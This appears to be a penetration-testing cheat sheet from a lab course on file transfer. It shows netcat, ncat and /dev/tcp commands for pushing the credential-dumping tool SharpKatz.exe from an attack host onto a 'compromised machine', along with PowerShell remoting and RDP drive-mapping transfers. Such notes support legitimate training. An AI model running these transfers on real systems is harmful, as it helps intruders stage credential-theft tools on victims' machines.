# Miscellaneous File Transfer Methods
## Netcat
**NetCat - Compromised Machine - Listening on Port 8000**
```
$ nc -l -p 8000 > SharpKatz.exe
```
**Netcat - Attack Host - Sending File to Compromised machine**
```
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
**Ncat - Attack Host - Sending File to Compromised machine**
```
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
**Attack Host - Sending File as Input to Netcat**
```
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
**Compromised Machine Connect to Netcat to Receive the File**
```
$ nc 192.168.49.128 443 > SharpKatz.exe
```
**Attack Host - Sending File as Input to Ncat**
```
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
**Compromised Machine Connect to Ncat to Receive the File**
```
$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**
```
$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
## Powershell Session File Transfer
PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. 

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.
**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**
```
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01

PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```
**Create a PowerShell Remoting Session to DATABASE01**
```
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
**Copy samplefile.txt from our Localhost to the DATABASE01 Session**
```
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
**Copy DATABASE.txt from DATABASE01 Session to our Localhost**
```
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
## RDP
**Mounting a Linux Folder Using rdesktop**
```
$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
**Mounting a Linux Folder Using xfreerdp**
```
$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

Alternatively, from Windows, the native `mstsc.exe` remote desktop client can be used.